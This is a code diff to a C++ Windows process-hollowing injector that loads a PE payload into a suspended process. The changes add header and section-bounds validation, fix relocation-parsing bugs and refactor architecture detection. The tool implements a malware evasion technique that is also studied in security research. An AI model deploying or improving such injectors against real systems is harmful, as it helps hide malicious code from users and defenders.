@@ -46,7 +46,8 @@ void CloseProcessAndCleanPayload(const LPPROCESS_INFORMATION lpPI,
  * \param lpFileContent: Ptr to the heap containing the payload
  */
 void CloseHandleAndCleanPayload(const LPPROCESS_INFORMATION lpPI,
-                                const LPVOID lpFileContent) {
+                                const LPVOID lpFileContent) 
+{
     // Free memory allocated for payload
     if (lpFileContent != nullptr) {
         HeapFree(GetProcessHeap(), 0, lpFileContent);
@@ -172,6 +173,34 @@ bool isValidPE(const LPVOID lpPayload, const DWORD dwFileSize) {
     return true;
 }
 
+bool isValidOptHeader32(const LPVOID lpFileContent)
+{
+    const auto lpDOS = (PIMAGE_DOS_HEADER)(uintptr_t)lpFileContent;
+
+    const auto lpNT = (PIMAGE_NT_HEADERS)((uintptr_t)lpDOS + lpDOS->e_lfanew);
+
+    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER32))
+    {
+        return false;
+    }
+
+    return true;
+}
+
+bool isValidOptHeader64(const LPVOID lpFileContent)
+{
+    const auto lpDOS = (PIMAGE_DOS_HEADER)(uintptr_t)lpFileContent;
+
+    const auto lpNT = (PIMAGE_NT_HEADERS)((uintptr_t)lpDOS + lpDOS->e_lfanew);
+
+    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64))
+    {
+        return false;
+    }
+
+    return true;
+}
+
 ProcessAddressInformation GetProcAddrInfo32(const LPPROCESS_INFORMATION lpPI) {
     std::cout << "\n=====GET TARGET PROCESS ADDRESS INFO (x86)=====\n";
     LPVOID lpProcessBaseAddress = nullptr;
@@ -228,22 +257,26 @@ ProcessAddressInformation GetProcAddrInfo64(const LPPROCESS_INFORMATION lpPI) {
                                      lpProcessBaseAddress};
 }
 
-char IsPayload32(const LPVOID lpFileContent) {
+enum class PayloadArch
+{
+    x86,
+    x64,
+    unsupported
+};
+
+PayloadArch GetPayloadArch(const LPVOID lpFileContent) {
     std::cout << "\n=====CHECK PAYLOAD ARCH=====\n";
     const auto pImgDOSHeader = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto pImgNTHeaders =
         (PIMAGE_NT_HEADERS)((uintptr_t)pImgDOSHeader + pImgDOSHeader->e_lfanew);
 
     if (pImgNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC && pImgNTHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
-        std::cout << "\nResult: x86";
-        return '8';
+        return PayloadArch::x86;
     } else if (pImgNTHeaders->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC && pImgNTHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ) {
-        std::cout << "\nResult: x64";
-        return '6';
+        return PayloadArch::x64;
     }
 
-    std::cout << "\nThe Magic value is not valid";
-    return 'x';
+    return PayloadArch::unsupported;
 }
 
 DWORD GetPayloadSubsystem32(const LPVOID lpFileContent) {
@@ -313,6 +346,12 @@ bool HasReloc32(const LPVOID lpFileContent) {
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);
 
+    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER32))
+    {
+        std::cout << "\nSizeOfOptionalHeader is insufficient.";
+        return false;
+    }
+
     if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
             .VirtualAddress != 0)
         return true;
@@ -324,6 +363,12 @@ bool HasReloc64(const LPVOID lpFileContent) {
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);
 
+    if(lpNT->FileHeader.SizeOfOptionalHeader < sizeof(IMAGE_OPTIONAL_HEADER64))
+    {
+        std::cout << "\nSizeOfOptionalHeader is insufficient.";
+        return false;
+    }
+
     if (lpNT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
             .VirtualAddress != 0)
         return true;
@@ -331,7 +376,7 @@ bool HasReloc64(const LPVOID lpFileContent) {
     return false;
 }
 
-bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
+bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent, const DWORD dwFileSize) {
     // Get headers
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);
@@ -372,6 +417,12 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
             (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
             std::cout
                 << "\nThe section's size is larger than the allocated space.";
+            return false;
+        }
+        
+        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
+        {
+            std::cout << "\nSection exceeds file size limit.";
             return false;
         }
 
@@ -438,7 +489,7 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
     return true;
 }
 
-bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
+bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent, const DWORD dwFileSize) {
     // Get headers
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);
@@ -483,6 +534,12 @@ bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
             (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
             std::cout
                 << "\nThe section's size is larger than the allocated space.";
+            return false;
+        }
+
+        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
+        {
+            std::cout << "\nSection exceeds file size limit.";
             return false;
         }
 
@@ -575,7 +632,7 @@ IMAGE_DATA_DIRECTORY GetReloc64(const LPVOID lpFileContent) {
 }
 
 bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
-                  const LPVOID lpFileContent) {
+                  const LPVOID lpFileContent, const DWORD dwFileSize) {
     // Get headers
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS32)((uintptr_t)lpDOS + lpDOS->e_lfanew);
@@ -663,6 +720,12 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
             return false;
         }
 
+        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
+        {
+            std::cout << "\nSection exceeds file size limit.";
+            return false;
+        }
+
         if (bNeedReloc &&
             ImgDataReloc.VirtualAddress >=
                 (uintptr_t)lpImageSectionHeader->VirtualAddress &&
@@ -715,7 +778,6 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                                                    lpRelocSection
                                                        ->VirtualAddress));  // Get the reloc block
 
-            dwRemainingByte -= sizeof(IMAGE_BASE_RELOCATION);
             dwRelocOffset += sizeof(IMAGE_BASE_RELOCATION);
 
             if(RelocBlock->SizeOfBlock < 0x8)
@@ -728,6 +790,9 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                 std::cout << "\nSizeOfBlock is larger than remaining bytes.";
                 return false;
             }
+
+            dwRemainingByte -= sizeof(IMAGE_BASE_RELOCATION);
+
             DWORD dwNumOfEntries = (DWORD)(RelocBlock->SizeOfBlock - 0x8) /
                                    0x2;  // 0x2 is the size of IMAGE_RELOC_ENTRY
 
@@ -842,7 +907,7 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
 }
 
 bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
-                  const LPVOID lpFileContent) {
+                  const LPVOID lpFileContent, const DWORD dwFileSize) {
     // Get headers
     const auto lpDOS = (PIMAGE_DOS_HEADER)lpFileContent;
     const auto lpNT = (PIMAGE_NT_HEADERS64)((uintptr_t)lpDOS + lpDOS->e_lfanew);
@@ -902,8 +967,8 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
     if (bNeedReloc)
         ImgDataReloc = GetReloc64(lpFileContent);  // The reloc table
 
-    if (bNeedReloc && ImgDataReloc.VirtualAddress == 0 ||
-        ImgDataReloc.Size == 0) {
+    if (bNeedReloc && (ImgDataReloc.VirtualAddress == 0 ||
+        ImgDataReloc.Size == 0)) {
         std::cout << "\nUnable to retrieve reloc table. Error code: "
                   << GetLastError();
         return false;
@@ -936,6 +1001,12 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
             (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
             std::cout
                 << "\nThe section's size is larger than the allocated space.";
+            return false;
+        }
+
+        if((lpImageSectionHeader->PointerToRawData + lpImageSectionHeader->SizeOfRawData) > dwFileSize)
+        {
+            std::cout << "\nSection exceeds file size limit.";
             return false;
         }
 
@@ -1032,7 +1103,7 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                                                             ->VirtualAddress) +
                                                        dwRelocOffset);
                 dwRelocOffset += 0x2;
-
+                dwRemainingByte -= 0x2;
                 // Padding entry, no need to intervene
                 if (RelocEntry->Type == IMAGE_REL_BASED_ABSOLUTE) continue;
 
@@ -1152,7 +1223,7 @@ int main(const int argc, char* argv[]) {
     if (!isValidPE(lpFileContent,
                    dwFileSize))  // Check if the payload is a valid PE file
     {
-        std::cout << "\nThe payload is not a PE file.";
+        std::cout << "\nThe payload is not satisfied as a PE file.";
         HeapFree(GetProcessHeap(), 0, lpFileContent);
         return -1;
     }
@@ -1228,25 +1299,40 @@ int main(const int argc, char* argv[]) {
      */
 
     /*32 or 64*/
-    char cPayload32 = IsPayload32(lpFileContent);
-    if (cPayload32 == 'x') {
+    PayloadArch plArch = GetPayloadArch(lpFileContent);
+    if(plArch == PayloadArch::unsupported)
+    {
+        std::cout << "\nUnsupported payload's architecture.";
         CloseProcessAndCleanPayload(&PI, lpFileContent);
         return -1;
     }
 
-    if ((cPayload32 == '8' && !bTarget32) || (cPayload32 == '6' && bTarget32)) {
-        std::cout << "\nArchitecture is not compatible.";
-        std::cout << "\n- Payload: "
-                  << ((cPayload32 == '8') ? "32-bit" : "64-bit");
-        std::cout << "\n- Target: " << (bTarget32 ? "32-bit" : "64-bit");
-        CloseProcessAndCleanPayload(&PI, lpFileContent);
-        return -1;
+    bool bPayload32 = (plArch == PayloadArch::x86)? true : false;
+
+    /*Check the size of optional header*/
+    if(bPayload32)
+    {
+        if(!isValidOptHeader32(lpFileContent))
+        {
+            std::cout << "\nOptionalHeader size is not eligible.";
+            CloseProcessAndCleanPayload(&PI, lpFileContent);
+            return -1;
+        }
+    }
+    else
+    {
+        if(!isValidOptHeader64(lpFileContent))
+        {
+            std::cout << "\nOptionalHeader size is not eligible.";
+            CloseProcessAndCleanPayload(&PI, lpFileContent);
+            return -1; 
+        }
     }
 
     /*Subsystem*/
     std::cout << "\n=====SUBSYSTEM=====\n";
     DWORD dwPayloadSubsystem;
-    if (cPayload32 == '8')
+    if (bPayload32)
         dwPayloadSubsystem = GetPayloadSubsystem32(lpFileContent);
     else
         dwPayloadSubsystem = GetPayloadSubsystem64(lpFileContent);
@@ -1286,15 +1372,15 @@ int main(const int argc, char* argv[]) {
     /***********************************/
 
     bool bPayloadHasReloc;
-    if (cPayload32 == '8')
+    if (bPayload32)
         bPayloadHasReloc = HasReloc32(lpFileContent);
     else
         bPayloadHasReloc = HasReloc64(lpFileContent);
 
     // Executing
-    if (cPayload32 == '8' && !bPayloadHasReloc) {
+    if (bPayload32 && !bPayloadHasReloc) {
         std::cout << "\n=====PE32=====\n";
-        if (RunPE32(&PI, lpFileContent)) {
+        if (RunPE32(&PI, lpFileContent, dwFileSize)) {
             std::cout << "\nProcess Hollowing successfully executed.";
             CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
@@ -1302,26 +1388,26 @@ int main(const int argc, char* argv[]) {
 
     }
 
-    else if (cPayload32 == '8' && bPayloadHasReloc) {
+    else if (bPayload32 && bPayloadHasReloc) {
         std::cout << "\n=====PEReloc32=====\n";
-        if (RunPEReloc32(&PI, lpFileContent)) {
+        if (RunPEReloc32(&PI, lpFileContent, dwFileSize)) {
             std::cout << "\nProcess Hollowing successfully executed.";
             CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
     }
 
-    if (cPayload32 == '6' && !bPayloadHasReloc) {
+    if (!bPayload32 && !bPayloadHasReloc) {
         std::cout << "\n=====PE64=====\n";
-        if (RunPE64(&PI, lpFileContent)) {
+        if (RunPE64(&PI, lpFileContent, dwFileSize)) {
             std::cout << "\nProcess Hollowing successfully executed.";
             CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
         }
 
-    } else if (cPayload32 == '6' && bPayloadHasReloc) {
+    } else if (!bPayload32 && bPayloadHasReloc) {
         std::cout << "\n=====PEReloc64=====\n";
-        if (RunPEReloc64(&PI, lpFileContent)) {
+        if (RunPEReloc64(&PI, lpFileContent, dwFileSize)) {
             std::cout << "\nProcess Hollowing successfully executed.";
             CloseHandleAndCleanPayload(&PI, lpFileContent);
             return 0;
